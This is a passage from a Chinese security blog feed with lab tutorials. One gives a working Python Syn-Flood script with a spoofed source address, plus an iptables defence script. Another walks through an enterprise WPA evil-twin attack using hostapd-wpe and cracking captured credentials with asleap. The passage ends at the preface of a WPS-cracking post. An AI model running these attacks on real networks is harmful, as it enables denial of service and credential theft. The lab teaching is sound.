<h2 id="0x03-Syn-Flood攻击实战"><a href="#0x03-Syn-Flood攻击实战" class="headerlink" title="0x03. Syn-Flood攻击实战"></a>0x03. Syn-Flood攻击实战</h2><h4 id="emsp-emsp-有了前面的理论基础，大家就能开心的做自己的测试了，就算遇到问题也能轻松的解决啦！所以理论还是很有用的，不要一味的只知道操作步骤而不知道原理。还有就是脚本什么的大家可以根据自己的理解来编写，不一定要用我的蹩脚的代码。"><a href="#emsp-emsp-有了前面的理论基础，大家就能开心的做自己的测试了，就算遇到问题也能轻松的解决啦！所以理论还是很有用的，不要一味的只知道操作步骤而不知道原理。还有就是脚本什么的大家可以根据自己的理解来编写，不一定要用我的蹩脚的代码。" class="headerlink" title="&emsp;&emsp;有了前面的理论基础，大家就能开心的做自己的测试了，就算遇到问题也能轻松的解决啦！所以理论还是很有用的，不要一味的只知道操作步骤而不知道原理。还有就是脚本什么的大家可以根据自己的理解来编写，不一定要用我的蹩脚的代码。"></a>&emsp;&emsp;有了前面的理论基础，大家就能开心的做自己的测试了，就算遇到问题也能轻松的解决啦！所以理论还是很有用的，不要一味的只知道操作步骤而不知道原理。还有就是脚本什么的大家可以根据自己的理解来编写，不一定要用我的蹩脚的代码。</h4><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="emsp-emsp-1-Syn-Flood脚本"><a href="#emsp-emsp-1-Syn-Flood脚本" class="headerlink" title="&emsp;&emsp;1.Syn-Flood脚本"></a>&emsp;&emsp;1.Syn-Flood脚本</h4><h4 id="emsp-emsp-2-Wireshark抓包工具"><a href="#emsp-emsp-2-Wireshark抓包工具" class="headerlink" title="&emsp;&emsp;2.Wireshark抓包工具"></a>&emsp;&emsp;2.Wireshark抓包工具</h4><h4 id="emsp-emsp-3-metaploitable2-0-linux-emsp-IP-192-168-43-109"><a href="#emsp-emsp-3-metaploitable2-0-linux-emsp-IP-192-168-43-109" class="headerlink" title="&emsp;&emsp;3.metaploitable2.0-linux &emsp;IP=192.168.43.109"></a>&emsp;&emsp;3.metaploitable2.0-linux &emsp;IP=192.168.43.109</h4><h4 id="Syn-Flood脚本如下（注意：该脚本需要python-2-7版本，还需要安装scapy、threading、random库）："><a href="#Syn-Flood脚本如下（注意：该脚本需要python-2-7版本，还需要安装scapy、threading、random库）：" class="headerlink" title="Syn-Flood脚本如下（注意：该脚本需要python 2.7版本，还需要安装scapy、threading、random库）："></a>Syn-Flood脚本如下（注意：该脚本需要python 2.7版本，还需要安装scapy、threading、random库）：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> random</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Syn_flood</span><span class="params">(target_ip, target_port)</span>:</span></div><div class="line"> 	<span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line"> 		port = random.randint(<span class="number">0</span>,<span class="number">10000</span>)</div><div class="line"> 		send(IP(src=<span class="string">"1.1.1.1"</span>, dst=target_ip)/TCP(dport=target_port, sport=port),verbose=<span class="number">0</span>)</div><div class="line"> 		<span class="comment">#send(IP(dst=target_ip)/TCP(dport=target_port, sport=port),verbose=0)</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(target_ip, target_port, threads)</span>:</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"BEGIN TO ATTACK TARGET"</span></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, threads):</div><div class="line">		<span class="comment">#print "test" </span></div><div class="line">		t = threading.Thread(target=Syn_flood, args=(target_ip, target_port))</div><div class="line">		t.start()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__== <span class="string">"__main__"</span>: </div><div class="line">	target_ip = raw_input(<span class="string">"Please input the target_ip: "</span>)</div><div class="line">	target_port = int(raw_input(<span class="string">"Please input the target_port: "</span>))</div><div class="line">	threads = int(raw_input(<span class="string">"Please input the threads: "</span>))</div><div class="line">	main(target_ip, target_port, threads)</div></pre></td></tr></table></figure>
<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><h4 id="1-启动metasploit2-0，访问它的web服务-现在我们可以很流畅的访问到"><a href="#1-启动metasploit2-0，访问它的web服务-现在我们可以很流畅的访问到" class="headerlink" title="1.启动metasploit2.0，访问它的web服务,现在我们可以很流畅的访问到"></a>1.启动metasploit2.0，访问它的web服务,现在我们可以很流畅的访问到</h4><p><img src="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/D7EBB586D3244CBD93243747CE8FC296/1479" alt="image"></p>
<h4 id="2-启动python脚本，填写必要的参数，当然也可以攻击22，3389之类的基于TCP连接的端口"><a href="#2-启动python脚本，填写必要的参数，当然也可以攻击22，3389之类的基于TCP连接的端口" class="headerlink" title="2.启动python脚本，填写必要的参数，当然也可以攻击22，3389之类的基于TCP连接的端口"></a>2.启动python脚本，填写必要的参数，当然也可以攻击22，3389之类的基于TCP连接的端口</h4><p><img src="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/5C77A8A40E664C4792E55C8794927CB6/1484" alt="image"></p>
<h4 id="3-现在查看效果，可以看到web应用已经不能正常访问了，而且靶机的80端口由于受到Syn-Flood攻击全部处于SYN-RECV状态"><a href="#3-现在查看效果，可以看到web应用已经不能正常访问了，而且靶机的80端口由于受到Syn-Flood攻击全部处于SYN-RECV状态" class="headerlink" title="3.现在查看效果，可以看到web应用已经不能正常访问了，而且靶机的80端口由于受到Syn-Flood攻击全部处于SYN_RECV状态"></a>3.现在查看效果，可以看到web应用已经不能正常访问了，而且靶机的80端口由于受到Syn-Flood攻击全部处于SYN_RECV状态</h4><p><img src="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/495E79F164574A8696349DBC68DC7BF2/1491" alt="image"></p>
<hr>
<h2 id="0x04-防御措施"><a href="#0x04-防御措施" class="headerlink" title="0x04. 防御措施"></a>0x04. 防御措施</h2><h3 id="emsp-emsp-看到这里相信大家已经对Syn-Flood这种攻击方式有一定的了解了，下面来谈谈如何应对"><a href="#emsp-emsp-看到这里相信大家已经对Syn-Flood这种攻击方式有一定的了解了，下面来谈谈如何应对" class="headerlink" title="&emsp;&emsp;看到这里相信大家已经对Syn-Flood这种攻击方式有一定的了解了，下面来谈谈如何应对"></a>&emsp;&emsp;看到这里相信大家已经对Syn-Flood这种攻击方式有一定的了解了，下面来谈谈如何应对</h3><h4 id="1-如果某个端口和同一个IP建立了多个不完整连接，直接禁IP"><a href="#1-如果某个端口和同一个IP建立了多个不完整连接，直接禁IP" class="headerlink" title="1.如果某个端口和同一个IP建立了多个不完整连接，直接禁IP"></a>1.如果某个端口和同一个IP建立了多个不完整连接，直接禁IP</h4><h4 id="2-减少SYN-RECEIVED的过期时间"><a href="#2-减少SYN-RECEIVED的过期时间" class="headerlink" title="2.减少SYN-RECEIVED的过期时间"></a>2.减少SYN-RECEIVED的过期时间</h4><h4 id="3-设置SYN-Cookie"><a href="#3-设置SYN-Cookie" class="headerlink" title="3.设置SYN Cookie"></a>3.设置SYN Cookie</h4><h4 id="4-设置防火墙的进站和入站规则"><a href="#4-设置防火墙的进站和入站规则" class="headerlink" title="4.设置防火墙的进站和入站规则"></a>4.设置防火墙的进站和入站规则</h4><h4 id="5-记录日志方便溯源追踪真凶"><a href="#5-记录日志方便溯源追踪真凶" class="headerlink" title="5.记录日志方便溯源追踪真凶"></a>5.记录日志方便溯源追踪真凶</h4><h3 id="防御脚本"><a href="#防御脚本" class="headerlink" title="[*]防御脚本"></a>[*]防御脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line">netstat -an|grep SYN_RECV|awk <span class="string">'&#123;print$5&#125;'</span>|awk -F: <span class="string">'&#123;print$1&#125;'</span>|sort|uniq -c|sort -rn|awk <span class="string">'&#123;if ($1 &gt;5)  print $2&#125;'</span> &gt;&gt; /tmp/dropip</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(cat /tmp/dropip)</div><div class="line"><span class="keyword">do</span></div><div class="line">/sbin/iptables -A INPUT -s <span class="variable">$i</span> -j DROP</div><div class="line"><span class="built_in">echo</span> &amp;ldquo;<span class="variable">$i</span> <span class="built_in">kill</span> at `date`&amp;rdquo; &gt;&gt;/var/<span class="built_in">log</span>/ddos</div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure>
<hr>
<h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05. 结语"></a>0x05. 结语</h2><h4 id="emsp-emsp-关于拒绝服务攻击还有其他很多姿势，如果大家想了解更多的话可以关注一波公众号，我们一起探讨！我们这里也需要大家分享更多的知识一起来营造良好的学习氛围。"><a href="#emsp-emsp-关于拒绝服务攻击还有其他很多姿势，如果大家想了解更多的话可以关注一波公众号，我们一起探讨！我们这里也需要大家分享更多的知识一起来营造良好的学习氛围。" class="headerlink" title="&emsp;&emsp;关于拒绝服务攻击还有其他很多姿势，如果大家想了解更多的话可以关注一波公众号，我们一起探讨！我们这里也需要大家分享更多的知识一起来营造良好的学习氛围。"></a>&emsp;&emsp;关于拒绝服务攻击还有其他很多姿势，如果大家想了解更多的话可以关注一波公众号，我们一起探讨！我们这里也需要大家分享更多的知识一起来营造良好的学习氛围。</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[无线渗透(下)—企业级WPA破解]]></title>
      <url>/2017/09/03/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F(%E4%B8%8B)%E2%80%94%E4%BC%81%E4%B8%9A%E7%BA%A7WPA%E7%A0%B4%E8%A7%A3/</url>
      <content type="html"><![CDATA[<h2 id="0x00-企业级WPA-WPA2简介"><a href="#0x00-企业级WPA-WPA2简介" class="headerlink" title="0x00. 企业级WPA/WPA2简介"></a><strong>0x00. 企业级WPA/WPA2简介</strong></h2><h4 id="emsp-emsp-WPA-WPA2企业版：在大型企业网络中，通常采用802-1X的接入认证方式。802-1X认证是一种基于接口的网络接入控制，用户提供认证所需的凭证，如用户名和密码，通过特定的用户认证服务器（一般是RADIUS服务器）和可扩展认证协议EAP（Extensible-Authentication-Protocol）实现对用户的认证。WPA-WPA2支持基于EAP-TLS（Transport-Layer-Security）和EAP-PEAP（Protected-EAP）的802-1X认证方式。"><a href="#emsp-emsp-WPA-WPA2企业版：在大型企业网络中，通常采用802-1X的接入认证方式。802-1X认证是一种基于接口的网络接入控制，用户提供认证所需的凭证，如用户名和密码，通过特定的用户认证服务器（一般是RADIUS服务器）和可扩展认证协议EAP（Extensible-Authentication-Protocol）实现对用户的认证。WPA-WPA2支持基于EAP-TLS（Transport-Layer-Security）和EAP-PEAP（Protected-EAP）的802-1X认证方式。" class="headerlink" title="&emsp;&emsp;WPA/WPA2企业版：在大型企业网络中，通常采用802.1X的接入认证方式。802.1X认证是一种基于接口的网络接入控制，用户提供认证所需的凭证，如用户名和密码，通过特定的用户认证服务器（一般是RADIUS服务器）和可扩展认证协议EAP（Extensible Authentication Protocol）实现对用户的认证。WPA/WPA2支持基于EAP-TLS（Transport Layer Security）和EAP-PEAP（Protected EAP）的802.1X认证方式。"></a>&emsp;&emsp;WPA/WPA2企业版：在大型企业网络中，通常采用802.1X的接入认证方式。802.1X认证是一种基于接口的网络接入控制，用户提供认证所需的凭证，如用户名和密码，通过特定的用户认证服务器（一般是RADIUS服务器）和可扩展认证协议EAP（Extensible Authentication Protocol）实现对用户的认证。WPA/WPA2支持基于EAP-TLS（Transport Layer Security）和EAP-PEAP（Protected EAP）的802.1X认证方式。</h4><a id="more"></a>
<h2 id="0x01-WPA-WPA2企业版认证原理"><a href="#0x01-WPA-WPA2企业版认证原理" class="headerlink" title="0x01. WPA/WPA2企业版认证原理"></a><strong>0x01. WPA/WPA2企业版认证原理</strong></h2><p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/54F51F9A7FAF47E2A10C6B88AFE7B07B/1150" alt="image"></p>
<h3 id="上图详细介绍了基于EAP-PEAP的802-1x认证方式（图片出自这里）"><a href="#上图详细介绍了基于EAP-PEAP的802-1x认证方式（图片出自这里）" class="headerlink" title="上图详细介绍了基于EAP-PEAP的802.1x认证方式（图片出自这里）"></a>上图详细介绍了基于EAP-PEAP的802.1x认证方式（<a href="http://blog.sina.com.cn/s/blog_afd4c4ef0102w4bz.html" target="_blank" rel="external">图片出自这里</a>）</h3><h4 id="emsp-emsp-1-首先STA向周围发送PROBE-REQUEST帧，等待应答"><a href="#emsp-emsp-1-首先STA向周围发送PROBE-REQUEST帧，等待应答" class="headerlink" title="&emsp;&emsp;1.首先STA向周围发送PROBE REQUEST帧，等待应答"></a>&emsp;&emsp;1.首先STA向周围发送PROBE REQUEST帧，等待应答</h4><h4 id="emsp-emsp-2-AP收到之后回应一个PROBE-RESPONSE帧给STA（AC连接多个AP）"><a href="#emsp-emsp-2-AP收到之后回应一个PROBE-RESPONSE帧给STA（AC连接多个AP）" class="headerlink" title="&emsp;&emsp;2.AP收到之后回应一个PROBE RESPONSE帧给STA（AC连接多个AP）"></a>&emsp;&emsp;2.AP收到之后回应一个PROBE RESPONSE帧给STA（AC连接多个AP）</h4><h4 id="emsp-emsp-3-认证开始，AP本身不会进行认证过程，而是将STA发送过来的认证信息转发给后端的RADIUS服务器，由RADIUS服务器控制整个认证过程"><a href="#emsp-emsp-3-认证开始，AP本身不会进行认证过程，而是将STA发送过来的认证信息转发给后端的RADIUS服务器，由RADIUS服务器控制整个认证过程" class="headerlink" title="&emsp;&emsp;3.认证开始，AP本身不会进行认证过程，而是将STA发送过来的认证信息转发给后端的RADIUS服务器，由RADIUS服务器控制整个认证过程"></a>&emsp;&emsp;3.认证开始，AP本身不会进行认证过程，而是将STA发送过来的认证信息转发给后端的RADIUS服务器，由RADIUS服务器控制整个认证过程</h4><h4 id="emsp-emsp-4-认证成功，连接上AP（具体交换的数据信息我在WPA加密那篇说过了，这里不再累赘）"><a href="#emsp-emsp-4-认证成功，连接上AP（具体交换的数据信息我在WPA加密那篇说过了，这里不再累赘）" class="headerlink" title="&emsp;&emsp;4.认证成功，连接上AP（具体交换的数据信息我在WPA加密那篇说过了，这里不再累赘）"></a>&emsp;&emsp;4.认证成功，连接上AP（具体交换的数据信息我在<a href="https://times0ng.github.io/2017/08/30/无线渗透-上-WPA加密/">WPA加密</a>那篇说过了，这里不再累赘）</h4><h2 id="0x02-WPA-WPA2企业版攻击原理"><a href="#0x02-WPA-WPA2企业版攻击原理" class="headerlink" title="0x02. WPA/WPA2企业版攻击原理"></a><strong>0x02. WPA/WPA2企业版攻击原理</strong></h2><h4 id="emsp-emsp-在企业级的WPA认证过程中会需要账号密码来登陆AP，我们所需要做的就是伪造一个相同ESSID的AP，同样在后端也伪造RADIUS服务器，如果STA来连接伪造的AP，那么它就会将加密后的密钥传输给我们的RADIUS服务器，离线破解密钥就能得到密码，账号是明文传输的。"><a href="#emsp-emsp-在企业级的WPA认证过程中会需要账号密码来登陆AP，我们所需要做的就是伪造一个相同ESSID的AP，同样在后端也伪造RADIUS服务器，如果STA来连接伪造的AP，那么它就会将加密后的密钥传输给我们的RADIUS服务器，离线破解密钥就能得到密码，账号是明文传输的。" class="headerlink" title="&emsp;&emsp;在企业级的WPA认证过程中会需要账号密码来登陆AP，我们所需要做的就是伪造一个相同ESSID的AP，同样在后端也伪造RADIUS服务器，如果STA来连接伪造的AP，那么它就会将加密后的密钥传输给我们的RADIUS服务器，离线破解密钥就能得到密码，账号是明文传输的。"></a>&emsp;&emsp;在企业级的WPA认证过程中会需要账号密码来登陆AP，我们所需要做的就是伪造一个相同ESSID的AP，同样在后端也伪造RADIUS服务器，如果STA来连接伪造的AP，那么它就会将加密后的密钥传输给我们的RADIUS服务器，离线破解密钥就能得到密码，账号是明文传输的。</h4><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><h4 id="emsp-emsp-1-伪造一个企业级的AP"><a href="#emsp-emsp-1-伪造一个企业级的AP" class="headerlink" title="&emsp;&emsp;1.伪造一个企业级的AP"></a>&emsp;&emsp;1.伪造一个企业级的AP</h4><h4 id="emsp-emsp-2-诱使目标连接AP，获取加密后的密钥"><a href="#emsp-emsp-2-诱使目标连接AP，获取加密后的密钥" class="headerlink" title="&emsp;&emsp;2.诱使目标连接AP，获取加密后的密钥"></a>&emsp;&emsp;2.诱使目标连接AP，获取加密后的密钥</h4><h4 id="emsp-emsp-3-离线破解，获取明文密钥"><a href="#emsp-emsp-3-离线破解，获取明文密钥" class="headerlink" title="&emsp;&emsp;3.离线破解，获取明文密钥"></a>&emsp;&emsp;3.离线破解，获取明文密钥</h4><h2 id="0x03-攻击实战"><a href="#0x03-攻击实战" class="headerlink" title="0x03. 攻击实战"></a><strong>0x03. 攻击实战</strong></h2><h4 id="下面给大家介绍一下攻击的操作步骤："><a href="#下面给大家介绍一下攻击的操作步骤：" class="headerlink" title="下面给大家介绍一下攻击的操作步骤："></a>下面给大家介绍一下攻击的操作步骤：</h4><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="emsp-emsp-1-kali-Linux虚拟机"><a href="#emsp-emsp-1-kali-Linux虚拟机" class="headerlink" title="&emsp;&emsp;1.kali Linux虚拟机"></a>&emsp;&emsp;1.kali Linux虚拟机</h4><h4 id="emsp-emsp-2-TL-WN722N网卡"><a href="#emsp-emsp-2-TL-WN722N网卡" class="headerlink" title="&emsp;&emsp;2.TL-WN722N网卡"></a>&emsp;&emsp;2.TL-WN722N网卡</h4><h3 id="环境布置与实战"><a href="#环境布置与实战" class="headerlink" title="环境布置与实战"></a>环境布置与实战</h3><h4 id="1-为了伪造企业级的AP，我们需要先给kali中的hostapd打上hostapd-wpe补丁"><a href="#1-为了伪造企业级的AP，我们需要先给kali中的hostapd打上hostapd-wpe补丁" class="headerlink" title="1.为了伪造企业级的AP，我们需要先给kali中的hostapd打上hostapd-wpe补丁"></a>1.为了伪造企业级的AP，我们需要先给kali中的hostapd打上hostapd-wpe补丁</h4><blockquote>
<p>git clone <a href="https://github.com/OpenSecurityResearch/hostapd-wpe" target="_blank" rel="external">https://github.com/OpenSecurityResearch/hostapd-wpe</a></p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/6B43F1B59EF54B5BA8B0E9E615D324D6/1240" alt="image"></p>
<h4 id="2-下载最新版的hostpad，安装依赖包"><a href="#2-下载最新版的hostpad，安装依赖包" class="headerlink" title="2.下载最新版的hostpad，安装依赖包"></a>2.下载最新版的hostpad，安装依赖包</h4><blockquote>
<p>wget <a href="http://w1.fi/releases/hostapd-2.6.tar.gz" target="_blank" rel="external">http://w1.fi/releases/hostapd-2.6.tar.gz</a> &amp;&amp; apt-get install libssl-dev libnl-genl-3-dev &amp;&amp;apt-get install libssl1.0-dev</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/76DD94DE395047BF91BD72C8DD30AFE0/1248" alt="image"></p>
<h4 id="3-解开tar包，给hostpad-2-6打补丁"><a href="#3-解开tar包，给hostpad-2-6打补丁" class="headerlink" title="3.解开tar包，给hostpad-2.6打补丁"></a>3.解开tar包，给hostpad-2.6打补丁</h4><blockquote>
<p>tar zxvf hostapd-2.6.tar.gz &amp;&amp; cd hostapd-2.6 &amp;&amp; patch -p1 &lt; ../hostapd-wpe/hostapd-wpe.patch</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/F125FC9E885443BB9836165B24FF07E7/1255" alt="image"></p>
<h4 id="4-编译hostpad"><a href="#4-编译hostpad" class="headerlink" title="4.编译hostpad"></a>4.编译hostpad</h4><blockquote>
<p>cd hostapd/ &amp;&amp; make</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/8A64997CEACA44EFB81293587A6A6268/1266" alt="image"></p>
<h4 id="5-生成伪造证书"><a href="#5-生成伪造证书" class="headerlink" title="5.生成伪造证书"></a>5.生成伪造证书</h4><blockquote>
<p>cd ../../hostapd-wpe/certs/ &amp;&amp; ./bootstrap</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/9CFFF7452B2240BBA16C45875C888B1B/1277" alt="image"></p>
<h4 id="6-配置hostapd-wpe-conf文件-ssid改为想要伪造的AP名字-我用的是wifi-free"><a href="#6-配置hostapd-wpe-conf文件-ssid改为想要伪造的AP名字-我用的是wifi-free" class="headerlink" title="6.配置hostapd-wpe.conf文件,ssid改为想要伪造的AP名字(我用的是wifi-free)"></a>6.配置hostapd-wpe.conf文件,ssid改为想要伪造的AP名字(我用的是wifi-free)</h4><blockquote>
<p>cd ../../hostapd-2.6/hostapd/ &amp;&amp; vim hostapd-wpe.conf</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/ED1BAA2EBFC747A299AD411C6C758A3A/1282" alt="image"></p>
<h4 id="7-启动无线网卡-不用开启monitor模式"><a href="#7-启动无线网卡-不用开启monitor模式" class="headerlink" title="7.启动无线网卡,不用开启monitor模式"></a>7.启动无线网卡,不用开启monitor模式</h4><blockquote>
<p>service network-manager stop &amp;&amp; airmon-ng check kill &amp;&amp; ifconfig wlan0 up</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/1EA0DEE4A1034E15AED92EC39C01928F/1292" alt="image"></p>
<h4 id="8-伪造AP-诱使目标连接"><a href="#8-伪造AP-诱使目标连接" class="headerlink" title="8.伪造AP,诱使目标连接"></a>8.伪造AP,诱使目标连接</h4><blockquote>
<p>./hostapd-wpe hostapd-wpe.conf</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/317A6ACB39EA468EABAB971E9038A33E/1299" alt="image"></p>
<h4 id="9-可以看到目标正在连接我们伪造的AP，用的username是admin，password经过了加密的，但是我们依然可以利用asleap来解密-C指定challenge，-R指定response，-W指定字典文件-下面是破解出来的密码password"><a href="#9-可以看到目标正在连接我们伪造的AP，用的username是admin，password经过了加密的，但是我们依然可以利用asleap来解密-C指定challenge，-R指定response，-W指定字典文件-下面是破解出来的密码password" class="headerlink" title="9.可以看到目标正在连接我们伪造的AP，用的username是admin，password经过了加密的，但是我们依然可以利用asleap来解密, -C指定challenge，-R指定response，-W指定字典文件.下面是破解出来的密码password"></a>9.可以看到目标正在连接我们伪造的AP，用的username是admin，password经过了加密的，但是我们依然可以利用asleap来解密, -C指定challenge，-R指定response，-W指定字典文件.下面是破解出来的密码password</h4><blockquote>
<p>asleap -C 8d:a9:83:98:98:f4:34:a6 -R e5:24:78:69:2e:29:9f:ee:42:d8c:d7:4e:d3:f5:65:22:da:7d:57:24:14:da:14 -W ../../sqlmap.txt</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/4D28868782C4468393CEEAB02EB4B2FE/1312" alt="image"></p>
<h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04. 防御"></a><strong>0x04. 防御</strong></h2><h4 id="emsp-emsp-和WPA个人级的防御策略一样，不要随意在任何地方连接Wi-Fi，尽量将密码设置复杂一点，再安全的加密措施也会被弱密码毁于一旦。"><a href="#emsp-emsp-和WPA个人级的防御策略一样，不要随意在任何地方连接Wi-Fi，尽量将密码设置复杂一点，再安全的加密措施也会被弱密码毁于一旦。" class="headerlink" title="&emsp;&emsp;和WPA个人级的防御策略一样，不要随意在任何地方连接Wi-Fi，尽量将密码设置复杂一点，再安全的加密措施也会被弱密码毁于一旦。"></a>&emsp;&emsp;和WPA个人级的防御策略一样，不要随意在任何地方连接Wi-Fi，尽量将密码设置复杂一点，再安全的加密措施也会被弱密码毁于一旦。</h4><h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05. 结语"></a><strong>0x05. 结语</strong></h2><h4 id="emsp-emsp-关于密码破解的文章就写到这里了，下篇文章笔者会教大家如果伪造AP，其实本篇文章已经通过hostapd伪造过一个AP了，笔者不过是想多介绍几种方法，大家挑喜欢的去用吧！另外最近笔者创建了自己的博客，欢迎大家访问。"><a href="#emsp-emsp-关于密码破解的文章就写到这里了，下篇文章笔者会教大家如果伪造AP，其实本篇文章已经通过hostapd伪造过一个AP了，笔者不过是想多介绍几种方法，大家挑喜欢的去用吧！另外最近笔者创建了自己的博客，欢迎大家访问。" class="headerlink" title="&emsp;&emsp;关于密码破解的文章就写到这里了，下篇文章笔者会教大家如果伪造AP，其实本篇文章已经通过hostapd伪造过一个AP了，笔者不过是想多介绍几种方法，大家挑喜欢的去用吧！另外最近笔者创建了自己的博客，欢迎大家访问。"></a>&emsp;&emsp;关于密码破解的文章就写到这里了，下篇文章笔者会教大家如果伪造AP，其实本篇文章已经通过hostapd伪造过一个AP了，笔者不过是想多介绍几种方法，大家挑喜欢的去用吧！另外最近笔者创建了自己的博客，欢迎大家<a href="https://times0ng.github.io">访问</a>。</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[无线渗透(中)--WPS破解]]></title>
      <url>/2017/08/30/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F(%E4%B8%AD)--WPS%E7%A0%B4%E8%A7%A3/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00. 前言"></a><strong>0x00. 前言</strong></h2><h4 id="emsp-emsp-基于第一篇文章WPA密码破解的反馈，有人提问说能否写一下关于WPA2的文章。笔者在这里回答一下，破解WPA2的流程和WPA是一样的，WPA2只是采用了更加复杂可靠的加密算法（利用CCMP替代了TKIP，AES替代了RC4），不过依然可以利用上一篇文章中提到的攻击原理来暴力破解PSK，所以笔者不会再写WPA2的内容。另外，由于某些缘故WEP密码破解可能不会写了，大家见谅，不过其他内容依然会陆续推出。"><a href="#emsp-emsp-基于第一篇文章WPA密码破解的反馈，有人提问说能否写一下关于WPA2的文章。笔者在这里回答一下，破解WPA2的流程和WPA是一样的，WPA2只是采用了更加复杂可靠的加密算法（利用CCMP替代了TKIP，AES替代了RC4），不过依然可以利用上一篇文章中提到的攻击原理来暴力破解PSK，所以笔者不会再写WPA2的内容。另外，由于某些缘故WEP密码破解可能不会写了，大家见谅，不过其他内容依然会陆续推出。" class="headerlink" title="&emsp;&emsp;基于第一篇文章WPA密码破解的反馈，有人提问说能否写一下关于WPA2的文章。笔者在这里回答一下，破解WPA2的流程和WPA是一样的，WPA2只是采用了更加复杂可靠的加密算法（利用CCMP替代了TKIP，AES替代了RC4），不过依然可以利用上一篇文章中提到的攻击原理来暴力破解PSK，所以笔者不会再写WPA2的内容。另外，由于某些缘故WEP密码破解可能不会写了，大家见谅，不过其他内容依然会陆续推出。"></a>&emsp;&emsp;基于第一篇文章<a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247484868&amp;idx=1&amp;sn=c9f9547e9bdb4fb9699ab47f2e307d35&amp;chksm=ec1e35ecdb69bcfa42443929bac42d030adda02d1885222aa53d6b4c49b736736be97d11ae7e&amp;mpshare=1&amp;scene=23&amp;srcid=0828jSmGdIm06mXCtMAZ6Ifq#rd" target="_blank" rel="external">WPA密码破解</a>的反馈，有人提问说能否写一下关于WPA2的文章。笔者在这里回答一下，破解WPA2的流程和WPA是一样的，WPA2只是采用了更加复杂可靠的加密算法（利用CCMP替代了TKIP，AES替代了RC4），不过依然可以利用上一篇文章中提到的攻击原理来暴力破解PSK，所以笔者不会再写WPA2的内容。另外，由于某些缘故WEP密码破解可能不会写了，大家见谅，不过其他内容依然会陆续推出。</h4><a id="more"></a>
<hr>
